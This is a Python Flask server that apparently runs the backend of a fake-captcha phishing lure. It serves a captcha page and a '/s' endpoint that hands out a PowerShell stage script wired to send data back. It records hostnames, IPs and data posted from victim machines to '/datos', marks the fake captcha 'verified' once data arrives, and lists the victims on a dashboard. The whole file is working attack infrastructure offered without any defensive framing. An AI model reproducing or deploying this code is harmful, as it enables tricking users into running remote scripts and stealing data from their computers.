#!/usr/bin/env python3
import fcntl
import json
import os
from datetime import datetime, timezone

from flask import Flask, request, jsonify, render_template, make_response, send_from_directory, abort

app = Flask(__name__)

PUBLIC_URL = os.environ.get("PUBLIC_URL", "http://localhost:8080")

DB_PATH = os.path.join(os.path.dirname(__file__), "db", "db.json")

os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
if not os.path.exists(DB_PATH):
    with open(DB_PATH, "w") as f:
        json.dump({"equipos": {}, "codes": {}}, f)


def _read_db():
    with open(DB_PATH, "r") as f:
        fcntl.flock(f, fcntl.LOCK_SH)
        db = json.load(f)
        fcntl.flock(f, fcntl.LOCK_UN)
    return db


def _update_db(fn):
    with open(DB_PATH, "r+") as f:
        fcntl.flock(f, fcntl.LOCK_EX)
        db = json.load(f)
        fn(db)
        f.seek(0)
        f.truncate()
        json.dump(db, f, indent=4)
        fcntl.flock(f, fcntl.LOCK_UN)


@app.route("/captcha", methods=["GET"])
def captcha():
    return render_template("captcha.html")


@app.route("/datos", methods=["POST"])
def datos():
    datos = request.get_json(force=True, silent=True)
    if not isinstance(datos, dict):
        return jsonify(error="Cuerpo JSON invalido o vacio"), 400

    hostname = str(datos.get("NombreEquipo", "")).strip()
    if not hostname:
        return jsonify(error="Falta el campo NombreEquipo"), 400

    verification_id = request.args.get("verification_id")
    ip = request.remote_addr
    now = datetime.now(timezone.utc).isoformat()

    def mutate(db):
        db.setdefault("equipos", {})[hostname] = {
            "recibido_en": now,
            "ip_origen": ip,
            "datos": datos,
        }
        db.setdefault("codes", {})[str(verification_id)] = True

    _update_db(mutate)

    return jsonify(estado="ok", hostname=hostname), 200


def cargar_equipos():
    try:
        return _read_db().get("equipos", {})
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


@app.route("/check-captcha")
def captcha_resuelto():
    verification_id = request.args.get("verification_id")
    if not verification_id:
        resp = jsonify({"authenticated": False})
    else:
        db = _read_db()
        authenticated = db.get("codes", {}).get(verification_id) is True
        resp = jsonify({"authenticated": authenticated})

    origin = request.headers.get("Origin", "")
    resp.headers["Access-Control-Allow-Origin"] = origin or PUBLIC_URL
    resp.headers["Access-Control-Allow-Credentials"] = "true"
    resp.headers["Vary"] = "Origin"
    return resp


@app.route("/dashboard")
def dashboard():
    equipos = cargar_equipos()
    return render_template("dashboard.html", equipos=equipos)


@app.route("/equipo/<hostname>")
def detalle(hostname):
    equipos = cargar_equipos()
    if hostname not in equipos:
        abort(404)
    return render_template("detalle.html", hostname=hostname, info=equipos[hostname])


@app.route("/s", methods=["GET"])
def ps_stage():
    token = request.args.get("t", "")
    if not token:
        abort(400)
    datos_url = PUBLIC_URL + "/datos?verification_id=" + token
    with open(os.path.join(os.path.dirname(__file__), "template.ps1"), encoding="utf-8") as f:
        script = f.read()
    script = script.replace("{{DATOS_URL}}", datos_url)
    return make_response(script, 200, {"Content-Type": "text/plain; charset=utf-8"})


@app.route("/sdk.js")
def sdk():
    resp = send_from_directory("static", "sdk.js", mimetype="application/javascript")
    resp.headers["Cache-Control"] = "no-store"
    return resp


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
